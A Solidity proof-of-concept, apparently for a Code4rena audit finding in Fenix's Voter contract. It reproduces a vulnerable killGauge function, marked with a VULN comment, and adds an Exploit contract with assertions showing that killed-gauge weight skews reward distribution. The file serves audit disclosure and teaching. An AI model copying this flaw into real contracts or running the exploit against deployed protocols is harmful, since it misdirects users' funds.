// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Fenix VoterUpgradeableV2 — H-01 (Code4rena, 2024-09), finding 41460.
    killGauge subtracts the gauge weight from totalWeightsPerEpoch and does
    not delete weightsPerEpoch. notifyRewardAmount then builds the index on
    the smaller total, while _distribute still pays the killed gauge's old
    weight. With 80 tokens and three 500-weight gauges, the first live gauge
    is paid 40, 40 is returned to the minter, and the last live gauge is
    paid 0. Fair distribution pays each gauge 26.666... tokens. */

contract Token {
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory s) {
        symbol = s;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Gauge {
    Token public token;
    address public voter;
    uint256 public paid;

    constructor(Token _token, address _voter) {
        token = _token;
        voter = _voter;
    }

    function notifyRewardAmount(address, uint256 amount) external {
        require(msg.sender == voter, "voter");
        require(token.transferFrom(msg.sender, address(this), amount), "pay");
        paid += amount;
    }
}

contract Minter {
    function notify(Voter voter, Token token, uint256 amount) external {
        token.approve(address(voter), amount);
        voter.notifyRewardAmount(amount);
    }
}

contract Voter {
    uint256 public constant WEEK = 7 days;
    Token public token;
    address public governance;
    address public minter;
    uint256 public index;
    uint256 public epoch;

    struct GaugeState {
        bool isAlive;
        address pool;
        uint256 claimable;
        uint256 index;
        uint256 lastDistributionTimestamp;
    }

    mapping(address => GaugeState) public gaugesState;
    mapping(uint256 => mapping(address => uint256)) public weightsPerEpoch;
    mapping(uint256 => uint256) public totalWeightsPerEpoch;

    constructor(Token _token, address _governance) {
        token = _token;
        governance = _governance;
        index = 10 ether;
        epoch = WEEK;
    }

    function setMinter(address _minter) external {
        minter = _minter;
    }

    function seed(address gauge_, address pool_, uint256 weight_) external {
        gaugesState[gauge_] = GaugeState(true, pool_, 0, 10 ether, 0);
        weightsPerEpoch[epoch][pool_] = weight_;
        totalWeightsPerEpoch[epoch] += weight_;
    }

    function rollEpoch() external {
        epoch += WEEK;
    }

    function killGauge(address gauge_) external {
        require(msg.sender == governance, "gov");
        GaugeState memory state = gaugesState[gauge_];
        require(state.isAlive, "alive");
        delete gaugesState[gauge_].isAlive;
        uint256 epochTimestamp = epoch;
        // @> VULN: epoch total loses the weight, weightsPerEpoch[pool] is left in place
        totalWeightsPerEpoch[epochTimestamp] -= weightsPerEpoch[epochTimestamp][state.pool];
    }

    function notifyRewardAmount(uint256 amount_) external {
        require(msg.sender == minter, "minter");
        require(token.transferFrom(msg.sender, address(this), amount_), "in");
        uint256 weightAt = totalWeightsPerEpoch[epoch - WEEK];
        if (weightAt > 0) {
            index += (amount_ * 1e18) / weightAt;
        }
    }

    function distributeOne(address gauge_) external {
        _distribute(gauge_);
    }

    function _distribute(address gauge_) internal {
        GaugeState memory state = gaugesState[gauge_];
        uint256 currentTimestamp = epoch;
        if (state.lastDistributionTimestamp < currentTimestamp) {
            uint256 totalVotesWeight = weightsPerEpoch[currentTimestamp - WEEK][state.pool];
            if (totalVotesWeight > 0) {
                uint256 delta = index - state.index;
                if (delta > 0) {
                    uint256 amount = (totalVotesWeight * delta) / 1e18;
                    if (state.isAlive) {
                        gaugesState[gauge_].claimable += amount;
                    } else {
                        require(token.transfer(minter, amount), "minter");
                    }
                }
            }
            gaugesState[gauge_].index = index;
            uint256 claimable = gaugesState[gauge_].claimable;
            if (claimable > 0 && state.isAlive) {
                gaugesState[gauge_].claimable = 0;
                gaugesState[gauge_].lastDistributionTimestamp = currentTimestamp;
                token.approve(gauge_, claimable);
                Gauge(gauge_).notifyRewardAmount(address(token), claimable);
            }
        }
    }
}

contract Exploit {
    uint256 public constant WEIGHT = 500 ether;
    uint256 public constant EMISSION = 80 ether;
    uint256 public constant FAIR = 26666666666666666500;

    Token public asset;
    Voter public voter;
    Minter public minter;
    Gauge public firstGauge;
    Gauge public lastGauge;
    Gauge public killedGauge;
    address public poolA;
    address public poolB;
    address public poolC;
    bool public lastPaid;
    uint256 public firstReceived;
    uint256 public weightLeft;

    constructor() {
        asset = new Token("FNX");
        voter = new Voter(asset, address(this));
        minter = new Minter();
        voter.setMinter(address(minter));
        firstGauge = new Gauge(asset, address(voter));
        lastGauge = new Gauge(asset, address(voter));
        killedGauge = new Gauge(asset, address(voter));
        poolA = address(uint160(1));
        poolB = address(uint160(2));
        poolC = address(uint160(3));
        voter.seed(address(firstGauge), poolA, WEIGHT);
        voter.seed(address(killedGauge), poolB, WEIGHT);
        voter.seed(address(lastGauge), poolC, WEIGHT);
        asset.mint(address(minter), EMISSION);
    }

    function _tryDistribute(address gauge_) internal returns (bool ok) {
        try voter.distributeOne(gauge_) {
            ok = true;
        } catch {
            ok = false;
        }
    }

    function run() external {
        voter.killGauge(address(killedGauge));
        weightLeft = voter.totalWeightsPerEpoch(voter.WEEK());
        voter.rollEpoch();
        minter.notify(voter, asset, EMISSION);
        voter.distributeOne(address(firstGauge));
        voter.distributeOne(address(killedGauge));
        lastPaid = _tryDistribute(address(lastGauge));
        firstReceived = firstGauge.paid();
        require(weightLeft == 1000 ether, "killed weight left the epoch total at 1000");
        require(voter.weightsPerEpoch(voter.WEEK(), poolB) == WEIGHT, "killed pool weight remains");
        require(firstReceived == 40 ether, "first gauge receives 40");
        require(lastPaid == false, "last gauge distribution reverts");
        require(lastGauge.paid() == 0, "last gauge is paid 0");
        require(firstReceived > FAIR, "first gauge is above the fair 26.666");
        require(asset.balanceOf(address(minter)) == 40 ether, "40 returned to the minter");
    }
}
